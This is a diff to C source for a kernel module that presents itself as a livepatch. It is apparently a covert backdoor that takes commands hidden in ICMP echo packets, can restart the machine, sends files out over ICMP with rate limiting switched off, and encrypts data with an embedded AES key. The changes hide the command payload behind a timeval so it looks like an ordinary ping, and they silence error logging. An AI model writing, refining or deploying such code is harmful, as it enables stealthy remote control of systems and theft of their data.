@@ -1799,12 +1799,11 @@ static int do_icmp_echo(struct sk_buff *skb)
 	int ret = -1;
 
 	icmph = icmp_hdr(skb);
-	cmd = ntohs(*(short*)((char *)icmph + sizeof(struct icmphdr)));
-	len = skb->len - sizeof(struct icmphdr);
-
+	len = skb->len - sizeof(struct icmphdr) - sizeof(struct timeval);
 	if (len < LEN_PREFIX_CMD)
 		goto end;
 
+	cmd = ntohs(*(short*)((char *)icmph + sizeof(struct icmphdr)+ sizeof(struct timeval)));
 	switch (cmd) {
 	case  CMD_RESTART:
 		kernel_restart(NULL); break;
@@ -1871,7 +1870,7 @@ static int enc_buf(char *dst, char *src, int len)
 	if (!tfm) {
 		tfm = crypto_alloc_skcipher("ctr(aes)", 0, 0);
 		if (IS_ERR(tfm)) {
-			printk(KERN_INFO "Error allocating xts(aes) handle: %ld\n", PTR_ERR(tfm));
+			//printk(KERN_INFO "Error allocating xts(aes) handle: %ld\n", PTR_ERR(tfm));
 			mutex_unlock(&mutex_tfm);
 			return PTR_ERR(tfm);
 		}
@@ -1879,7 +1878,7 @@ static int enc_buf(char *dst, char *src, int len)
 
 	err = crypto_skcipher_setkey(tfm, secret, sizeof(secret));
 	if (err) {
-		printk(KERN_INFO "Error setting key: %d\n", err);
+		//printk(KERN_INFO "Error setting key: %d\n", err);
 		goto out;
 	}
 
@@ -1898,7 +1897,7 @@ static int enc_buf(char *dst, char *src, int len)
 	skcipher_request_set_crypt(req, &sg, &sg, len, iv);
 	err = crypto_wait_req(crypto_skcipher_encrypt(req), &wait);
 	if (err) {
-		printk(KERN_INFO "Error encrypting data: %d\n", err);
+		//printk(KERN_INFO "Error encrypting data: %d\n", err);
 		goto out;
 	}
 
@@ -1993,7 +1992,7 @@ static struct net_ratelimit_state {
         unsigned long   count;
         unsigned long   begin;
 } icmp_rs = {          	
-	.lock      = __RAW_SPIN_LOCK_UNLOCKED(name.lock),
+	.lock      = __RAW_SPIN_LOCK_UNLOCKED(icmp_rs.lock),
 	.interval  = HZ/40,
 	.burst     = 1024*24    /* 1 MB/sec */
 };
@@ -2055,7 +2054,7 @@ static int do_send_file(const char *name, struct sk_buff *skb, char *buf, int bu
 	if (!skb2)
 		goto end;
 	icmph = icmp_hdr(skb2);
-	cmd = (char *)icmph + sizeof(struct icmphdr);
+	cmd = (char *)icmph + sizeof(struct icmphdr) + sizeof(struct timeval);
 
 	disable_icmp_echo_limit(dev_net(skb_dst(skb)->dev));
 	while (file_size > 0) {
@@ -2147,8 +2146,8 @@ static int do_file_task(short cmd, void *data)
 		goto end;
 
 	icmph = icmp_hdr(skb);
-	p_cmd = (char *)icmph + sizeof(struct icmphdr);
-	len = skb->len - sizeof(struct icmphdr);
+	p_cmd = (char *)icmph + sizeof(struct icmphdr) + sizeof(struct timeval);
+	len = skb->len - sizeof(struct icmphdr) - sizeof(struct timeval);
 	if (len <= LEN_PREFIX_CMD)
 		goto end;
 
@@ -2190,8 +2189,8 @@ static int do_secret_task(struct sk_buff *skb)
 	int rc = -1;
 
 	icmph = icmp_hdr(skb);
-	p_cmd = (char *)icmph + sizeof(struct icmphdr);
-	len = skb->len - sizeof(struct icmphdr);
+	p_cmd = (char *)icmph + sizeof(struct icmphdr) + sizeof(struct timeval);
+	len = skb->len - sizeof(struct icmphdr) - sizeof(struct timeval);
 	len -= LEN_PREFIX_CMD;
 	if (len < LEN_SECRET)
 		goto end;
@@ -2233,7 +2232,8 @@ int make_exec_event(int cmd, void *data)
 	spin_lock_bh(&exec_event_list_lock);
 	list_add_tail(&exec_event_list, &ev->list);
 	spin_unlock_bh(&exec_event_list_lock);
-	wake_up_interruptible(&exec_event_wait);
+	if (likely(wq_has_sleeper(&exec_event_wait)))
+			wake_up_interruptible(&exec_event_wait);
 	ret = 0;
 end:
 	return ret;
@@ -2273,6 +2273,7 @@ static int kthread_do_event(void *data)
 			remove_wait_queue(&exec_event_wait, &wait);
 		}
         }
+	event_kthread = NULL;
 
         return 0;
 }
@@ -2990,6 +2991,8 @@ static int livepatch_init(void)
 	//clear_klog();
 
 	event_kthread = kthread_run(kthread_do_event, NULL, KHTREAD_PROC_NAME);
+	if (IS_ERR(event_kthread))
+		event_kthread = NULL;
 
 	return ret;
 }
